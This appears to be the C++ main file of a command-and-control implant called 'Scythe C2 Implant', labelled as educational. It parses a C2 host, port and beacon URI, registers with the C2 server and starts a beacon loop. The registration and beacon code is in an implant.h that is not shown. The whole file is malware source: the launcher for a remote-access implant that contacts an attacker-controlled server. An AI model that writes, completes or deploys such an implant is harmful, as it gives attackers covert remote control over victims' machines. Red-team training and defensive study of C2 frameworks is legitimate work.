#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <signal.h>

#include "implant.h"

// Global implant pointer for signal handling
std::unique_ptr<Implant> g_implant = nullptr;

// Signal handler for graceful shutdown
void signalHandler(int signal) {
    std::cout << "\n[!] Received signal " << signal << ", shutting down gracefully..." << std::endl;
    if (g_implant) {
        g_implant->setRunning(false);
    }
}

int main(int argc, char* argv[]) {
    std::cout << "=== Scythe C2 Implant ===" << std::endl;
    std::cout << "[*] Educational C2 Framework" << std::endl;
    
    // Default C2 server settings
    std::string host = "127.0.0.1";
    std::string port = "8080";
    std::string uri = "/api/v1/beacon";
    
    // Parse command line arguments
    if (argc >= 2) {
        host = argv[1];
    }
    if (argc >= 3) {
        port = argv[2];
    }
    if (argc >= 4) {
        uri = argv[3];
    }
    
    std::cout << "[*] Target C2 Server: " << host << ":" << port << std::endl;
    std::cout << "[*] Beacon URI: " << uri << std::endl;
    
    try {
        // Create implant instance
        g_implant = std::make_unique<Implant>(host, port, uri);
        
        // Setup signal handlers for graceful shutdown
        signal(SIGINT, signalHandler);
        signal(SIGTERM, signalHandler);
        
        std::cout << "[*] Implant initialized successfully" << std::endl;
        
        // Attempt to register with C2 server
        std::cout << "[*] Attempting to register with C2 server..." << std::endl;
        if (g_implant->registerWithC2()) {
            std::cout << "[+] Registration successful!" << std::endl;
        } else {
            std::cout << "[!] Registration failed, but continuing with beaconing..." << std::endl;
        }
        
        // Start beacon loop in separate thread
        std::cout << "[*] Starting beacon loop..." << std::endl;
        std::thread beacon_thread([&]() {
            g_implant->beacon();
        });
        
        // Main thread waits for beacon thread to finish
        beacon_thread.join();
        
        std::cout << "[*] Beacon loop terminated" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Implant failed: " << e.what() << std::endl;
        return 1;
    }
    
    std::cout << "[*] Implant shutdown complete" << std::endl;
    return 0;
}